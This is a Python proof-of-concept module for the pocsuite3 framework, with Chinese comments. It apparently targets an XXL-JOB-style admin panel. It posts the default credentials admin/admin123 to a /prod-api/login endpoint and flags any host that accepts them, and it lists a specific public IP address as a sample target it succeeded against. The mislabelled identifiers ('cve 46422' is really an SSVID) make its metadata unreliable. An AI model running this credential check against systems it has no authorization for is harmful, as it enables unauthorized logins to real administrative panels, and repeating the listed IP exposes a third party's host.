import json

from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


# 关于类的继承
class XXLJOBPOC(POCBase):
    vulID = "46422"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "enni"  # PoC作者的大名
    vulDate = "2022-7-13"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-7-13"  # 编写 PoC 的日期
    updateDate = "2022-7-13"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/xuxueli/xxl-job"]  # 漏洞地址来源,0day不用写
    name = "cve 46422 PoC"  # PoC 名称
    appPowerLink = "https://github.com/xuxueli/xxl-job"  # 漏洞厂商主页地址
    appName = "46422"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://180.71.225.17:8083"]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ["requests"]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
                弱口令
            """  # 漏洞简要描述
    pocDesc = """
            """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        result = []
        url = f"{self.url}/prod-api/login"
        headers = {"Accept": "application/json, text/plain, */*", "isToken": "false",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                   "Content-Type": "application/json;charset=UTF-8", "Origin": f"{self.url}",
                   "Referer": f"{self.url}/login?redirect=%2Findex", "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        json = {"password": "admin123", "username": "admin", "uuid": "b25a7e8d84144793b57cb92ae1757413"}
        try:
            response = requests.post(url, headers=headers, json=json, verify=False, timeout=5,
                                     allow_redirects=False)
            # res = json.loads(response.text)
            # print(res.get("code"))
            res = response.json()
            # if response.status_code == 200:
            #     result.append(self.url)
            if res.get("code") == 200:
                result.append(self.url)
        except Exception:
            pass
        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        # 判断是否存在漏洞
        #     if data_dict.get("code") == 200 and data_dict.get("msg") == None:
        #         result.append(self.url)
        # except Exception as e:
        #     pass
        # 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


# 你会发现没有shell模式 , 对吧 ,根本就用不到

# 其他自定义的可添加的功能函数
def other_fuc():
    pass


# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类 , 必须要注册
register_poc(XXLJOBPOC)